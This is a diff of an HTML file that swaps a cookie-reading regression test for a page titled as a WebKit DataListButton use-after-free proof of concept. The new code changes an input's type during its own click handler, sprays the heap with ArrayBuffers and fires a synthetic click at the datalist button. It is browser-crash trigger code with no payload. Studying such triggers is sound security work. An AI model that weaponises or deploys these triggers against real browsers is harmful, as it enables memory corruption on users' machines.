@@ -1,60 +1,73 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>Teste de Regressão: Leitura de document.cookie com domCookiesForHost (SOUP)</title>
+    <meta charset="utf-8">
+    <title>WebKit DataListButton UAF PoC</title>
+    <style>
+        #input {
+            width: 320px;
+            height: 60px;
+            font-size: 24px;
+        }
+        #btn-trigger {
+            margin-top: 20px;
+            padding: 12px 24px;
+            font-size: 18px;
+        }
+    </style>
 </head>
 <body>
-<div id="status">Executando teste...</div>
+    <input id="input" type="text" list="list">
+    <datalist id="list">
+        <option value="Opcao A">
+        <option value="Opcao B">
+    </datalist>
 
-<script>
-// Função utilitária de GC via alocação recursiva de memória
-function gc() {
-    function gcRec(n) {
-        if (n < 1)
-            return {};
-        var temp = { i: "ab" + i + (i / 100000) };
-        temp += "foo";
-        gcRec(n - 1);
-    }
-    for (var i = 0; i < 1000; i++)
-        gcRec(10);
-}
+    <br>
+    <button id="btn-trigger">Disparar Teste</button>
+    <div id="status" style="margin-top: 15px; font-family: monospace;">Aguardando ação...</div>
 
-function runCookieTest() {
-    // 1. Define múltiplos cookies para o host atual
-    for (let i = 0; i < 20; i++) {
-        document.cookie = `test_cookie_${i}=val_${i}; path=/; SameSite=Lax`;
-    }
+    <script>
+    const input = document.getElementById('input');
+    const status = document.getElementById('status');
 
-    // 2. Itera leituras contínuas de document.cookie intercaladas com GC
-    // para tentar reutilizar a memória temporária do CString destruído
-    for (let cycle = 0; cycle < 100; cycle++) {
-        // Dispara a chamada nativa a NetworkStorageSession::domCookiesForHost()
-        const rawCookies = document.cookie;
+    input.addEventListener('click', (e) => {
+        status.innerText = 'Click interceptado. Alterando tipo do input...';
+        
+        // Destrói o TextFieldInputType durante a propagação do evento
+        input.type = 'button';
 
-        if (!rawCookies || !rawCookies.includes("test_cookie_0")) {
-            throw new Error("Falha ao recuperar cookies casados com o domínio.");
+        // Opcional: Reclamação de memória / GC Heap Spray
+        for (let i = 0; i < 1000; i++) {
+            new ArrayBuffer(1024);
         }
+    }, { once: true });
 
-        // Força pressão na heap para corromper a memória do ponteiro dangling se não houver o patch
-        if (cycle % 10 === 0) {
-            gc();
-        }
-    }
+    document.getElementById('btn-trigger').onclick = () => {
+        const rect = input.getBoundingClientRect();
+        
+        // Mira na borda direita onde o botão de lista é renderizado
+        const x = rect.left + rect.width - 15;
+        const y = rect.top + (rect.height / 2);
 
-    // 3. Limpa os cookies de teste
-    for (let i = 0; i < 20; i++) {
-        document.cookie = `test_cookie_${i}=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT`;
-    }
-}
+        // Tenta obter o target exato na camada visual
+        const target = document.elementFromPoint(x, y) || input;
 
-try {
-    runCookieTest();
-    document.getElementById("status").innerText = "PASS: Leitura de document.cookie executada sem Use-After-Free.";
-} catch (e) {
-    document.getElementById("status").innerText = "FAIL: " + e.message;
-}
-</script>
+        const evt = new MouseEvent('click', {
+            bubbles: true,
+            cancelable: true,
+            composed: true, // Crucial para permitir que o evento atravesse limites de Shadow DOM
+            view: window,
+            clientX: x,
+            clientY: y
+        });
+
+        target.dispatchEvent(evt);
+
+        setTimeout(() => {
+            status.innerText = 'Finalizado: Sem crash imediato.';
+        }, 100);
+    };
+    </script>
 </body>
 </html>
